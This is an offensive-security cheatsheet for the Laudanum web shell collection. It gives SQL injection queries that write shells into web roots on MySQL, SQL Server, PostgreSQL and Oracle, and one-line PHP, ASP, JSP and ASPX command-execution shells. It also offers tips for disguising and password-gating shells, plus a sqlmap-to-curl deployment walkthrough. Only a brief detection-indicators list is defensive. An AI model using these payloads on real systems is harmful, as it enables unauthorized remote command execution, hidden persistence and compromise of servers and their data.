# Laudanum — Cheatsheet

## Quick Reference

```bash
laudanum -h                    # Show directory structure
ls /usr/share/laudanum/        # List available tools
```

## Directory Structure

```
/usr/share/laudanum/
├── asp/          # Classic ASP shells
├── aspx/         # ASP.NET shells
├── cfm/          # ColdFusion shells
├── helpers/      # Utility scripts
├── jsp/          # Java Server Pages shells
├── php/          # PHP shells
└── wordpress/    # WordPress-specific persistence
```

## Shell Types by Platform

| Platform | Directory | Use When |
|----------|-----------|----------|
| IIS/Windows (Classic) | asp/ | SQL Server + Classic ASP |
| IIS/Windows (.NET) | aspx/ | SQL Server + ASP.NET |
| Apache/Tomcat | jsp/ | Oracle/MySQL + Tomcat |
| Apache/Nginx | php/ | MySQL/PostgreSQL + PHP |
| ColdFusion | cfm/ | CFML applications |
| WordPress | wordpress/ | WordPress with SQL injection |

## SQL Injection File Write Methods

### MySQL

```sql
-- INTO OUTFILE
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- INTO DUMPFILE (raw binary)
SELECT UNHEX('3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e') 
INTO DUMPFILE '/var/www/html/shell.php';
```

### SQL Server

```sql
-- Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Write ASPX shell
EXEC xp_cmdshell 'echo ^<%@ Page Language="C#" %^> > C:\inetpub\wwwroot\shell.aspx';
```

### PostgreSQL

```sql
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
```

### Oracle

```sql
SELECT '<?out.println(Runtime.getRuntime().exec(request.getParameter("c"))); ?>' 
INTO OUTFILE '/var/lib/tomcat/webapps/ROOT/shell.jsp' FROM dual;
```

## Shell Injection Patterns

### PHP Simple Shell

```php
<?php system($_GET["c"]); ?>
```

### PHP Stealth Shell

```php
<?php 
if(isset($_GET['k']) && $_GET['k']==='s3cr3t') {
    system($_GET['c']);
}
?>
```

### ASP Shell

```asp
<% 
Set objShell = Server.CreateObject("WSCRIPT.SHELL")
response.write objShell.exec("cmd /c " & request("c")).StdOut.ReadAll
%>
```

### JSP Shell

```jsp
<% Runtime.getRuntime().exec(request.getParameter("c")); %>
```

### ASPX Shell

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<% Response.Write(new Process(){StartInfo=new ProcessStartInfo(Request["c"]){UseShellExecute=false,RedirectStandardOutput=true}}.StandardOutput.ReadToEnd()); %>
```

## Stealth Tips

```bash
# Rename to blend in
shell.php → config.php.bak
shell.php → error_log.txt
shell.php → .htaccess.bak

# Minimal footprint
echo '<?php system($_GET["c"]); ?>' > /var/www/html/.x.php

# Add authentication
echo '<?php if($_GET["k"]=="pass") system($_GET["c"]); ?>' > shell.php
```

## Quick Deployment

```bash
# Step 1: Find SQL injection
sqlmap -u "http://target.example.com/page?id=1" --dbs

# Step 2: Check write access
sqlmap -u "http://target.example.com/page?id=1" --file-write=shell.php --file-dest=/var/www/html/shell.php

# Step 3: Access shell
curl "http://target.example.com/shell.php?c=id"
```

## Common Use Cases

| Scenario | Language | Method |
|----------|----------|--------|
| MySQL + Apache | PHP | `INTO OUTFILE` |
| SQL Server + IIS | ASPX | `xp_cmdshell` |
| Oracle + Tomcat | JSP | `INTO OUTFILE` |
| WordPress | PHP | UNION injection |
| PostgreSQL | PHP | `COPY TO` |
| ColdFusion | CFM | `cf_file` tag |

## Limitations

- Known AV/IDS signatures — modify files
- Requires file write access via SQL injection
- Web server must execute the injected language
- File permissions may block execution
- WAF may detect shell patterns
- Access logs record shell usage

## Detection Indicators

- Unusual files in web root
- `system()`, `exec()`, `eval()` in web files
- `<?php` tags in non-PHP directories
- Unexpected ASP/JSP files
- Shell command execution in web server process
- HTTP requests to unusual filenames

## Related Tools

| Tool | Purpose |
|------|---------|
| weevely | Advanced PHP shell (encrypted) |
| webacoo | PHP shell with cookie auth |
| webshells | Kali's broader shell collection |
| sqlmap | Automated SQL injection |
| chisel | HTTP tunnel for data exfiltration |
